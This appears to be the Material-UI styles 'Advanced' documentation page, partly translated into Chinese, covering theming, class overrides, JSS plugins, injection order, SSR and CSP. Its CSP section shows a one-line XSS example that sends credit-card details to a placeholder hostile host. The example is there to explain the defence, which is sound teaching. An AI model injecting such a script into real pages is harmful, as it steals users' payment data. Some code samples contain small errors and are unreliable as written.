# 高级

<p class="description">This section covers more advanced usage of @material-ui/styles.</p>

## 主题

Add a `ThemeProvider` to the top level of your app to pass the theme down the React component tree. Then, you can access the theme object in style functions.

```jsx
import { ThemeProvider } from '@material-ui/styles';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/styles/advanced/Theming.js"}}

### 访问组件中的主题

您可能需要访问React组件中的主题变量。

#### `useTheme` hook

```jsx
import { useTheme } from '@material-ui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/styles/advanced/UseTheme.js"}}

#### `withTheme` HOC

```jsx
import { withTheme } from '@material-ui/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/styles/advanced/WithTheme.js"}}

### 主题嵌套

您可以嵌套多个主题提供者。 This can be really useful when dealing with different areas of your application that have distinct appearance from each other.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/styles/advanced/ThemeNesting.js"}}

内的主题将 **倍率** 外的主题。 您可以通过提供一个函数来扩展外部主题：

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## Overriding styles - `classes` prop

The `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. The is particularly useful when styling nested elements in a component.

```jsx
// A style sheet
const useStyles = makeStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
});

function Nested(props) {
  const classes = useStyles();
  return (
    <button className={classes.root}> // 'jss1'
      <span className={classes.label}> // 'jss2'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested />
}
```

However, the class names are often non-deterministic. How can a parent component override the style of a nested element?

### withStyles

This is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.

```jsx
const Nested = withStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
})({ classes }) => (
  <button className={classes.root}>
    <span className={classes.label}> // 'jss2 my-label'
      Nested
    </span>
  </button>
));

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

### makeStyles

The hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.

```jsx
const useStyles = makeStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
});

function Nested(props) {
  const classes = useStyles(props);
  return (
    <button className={classes.root}>
      <span className={classes.label}> // 'jss2 my-label'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

## JSS plugins

JSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.

Not all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

Of course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String templates

If you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

Note that this doesn't support selectors, or nested rules.

{{"demo": "pages/styles/advanced/StringTemplates.js"}}

## CSS 注入顺序

> It's **really important** to understand how the CSS specificity is calculated by the browser. It's one of the key elements to know when overriding styles. We **encourage** you to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)

By default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.

### injectFirst

The `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):

```jsx
import { StylesProvider } from '@material-ui/styles';

<StylesProvider injectFirst>
  {/* Your component tree.
      Styled components can override Material-UI's styles. */}
</StylesProvider>
```

### `makeStyles` / `withStyles` / `styled`

The injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:

```jsx
import clsx from 'clsx';
import { makeStyles } from '@material-ui/styles';

const useStyleBase = makeStyles({
  root: {
    color: 'blue', // 🔵
  },
});

const useStyle = makeStyles({
  root: {
    color: 'red', // 🔴
  },
});

export default function MyComponent() {
  // Order doesn't matter
  const classes = useStyles();
  const classesBase = useStyleBase();

  // Order doesn't matter
  const className = clsx(classes.root, useStyleBase.root)

  // color: red 🔴 wins.
  return <div className={className} />;
}
```

The hook call order and the class name concatenation order **don't matter**.

### insertionPoint

JSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.

#### HTML 注释

The simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### 其他 HTML 元素

创建生产环境时, [Create React App](https://github.com/facebook/create-react-app) 会剥离 HTML 注释。 To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### JS createComment

codesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## 服务器端呈现

This example returns a string of HTML and inlines the critical CSS required, right before it’s used:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

You can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.

### Gatsby

We have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.

Refer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.

### Next.js

You need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.

Refer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.

## Class names

The class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).

### 默认

By default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:

```js
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
});
```

This will generate a class name such as `makeStyles-root-123`.

You have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.

- In **development**, the class name is: `.makeStyles-root-123`, following this logic:

```js
const sheetName = 'makeStyles';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In **production**, the class name is: `.jss123`, following this logic:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

### With `@material-ui/core`

The generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:

- Only one theme provider is used (**No theme nesting**)
- The style sheet has a name that starts with `Mui`. (All Material-UI components)
- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false`. (The default)

These conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:

```jsx
const useStyles = makeStyles({
  root: { /* … */ },
  label: { /* … */ },
  outlined: {
    /* … */
    '&$disabled': { /* … */ },
  },
  outlinedPrimary: {
    /* … */
    '&:hover': { /* … */ },
  },
  disabled: {},
}, { name: 'MuiButton' });
```

generates the following class names you that can override:

```css
.MuiButton-root { /* … */ }
.MuiButton-label { /* … */ }
.MuiButton-outlined { /* … */ }
.MuiButton-outlined.Mui-disabled { /* … */ }
.MuiButton-outlinedPrimary: { /* … */ }
.MuiButton-outlinedPrimary:hover { /* … */ }
```

*This is a simplification of the `@material-ui/core/Button` component's style sheet.*

Customization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:

```jsx
import styled from 'styled-components';
import { TextField } from '@material-ui/core';

const StyledTextField = styled(TextField)`
  label.focused {
    color: green; 💚
  }
  .MuiOutlinedInput-root {
    fieldset {
      border-color: red; ❤️
    }
    &:hover fieldset {
      border-color: yellow; 💛
    }
    &.Mui-focused fieldset {
      border-color: green; 💚
    }
  }
`;
```

{{"demo": "pages/styles/advanced/GlobalClassName.js"}}

## 全局CSS

### `jss-plugin-global`

The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.

{{"demo": "pages/styles/advanced/GlobalCss.js"}}

### Hybrid

You can also combine JSS generated class names with global ones.

{{"demo": "pages/styles/advanced/HybridGlobalCss.js"}}

## CSS prefixes

JSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.

## 内容安全政策（CSP）

### 什么是CSP，为什么它有用？

基本上，CSP通过要求开发人员将其资产从中检索的源列入白名单来缓解跨站点脚本（XSS）攻击。 此列表作为服务器的标头返回。 例如，假设您有一个托管在` https://example.com`的网站 CSP头`default-src：'self';`将允许位于`https://example.com/*`的所有资产并否认所有其他人。 如果您的网站的某个部分容易受到XSS的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### 如何实现CSP？

为了将CSP与Material-UI（和JSS）一起使用，您需要使用nonce。 A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS有[一个很棒的教程](https://github.com/cssinjs/jss/blob/next/docs/csp.md)关于如何使用Express和React Helmet实现这一目标。 对于基本纲要，请继续阅读。

CSP nonce是Base 64编码的字符串。 你可以这样生成一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

It is very important that you use UUID version 4, as it generates an **unpredictable** string. 然后，将此随机数应用于CSP标头。 应用了随机数时，CSP标头可能如下所示：

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

If you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() } }
/>
```

然后，您必须将此随机数传递给JSS，以便将其添加到后续`<style>`标记中。 客户端从头部获取nonce。 无论是否使用SSR，都必须包含此标头。

```jsx
<meta property="csp-nonce" content={nonce} />
```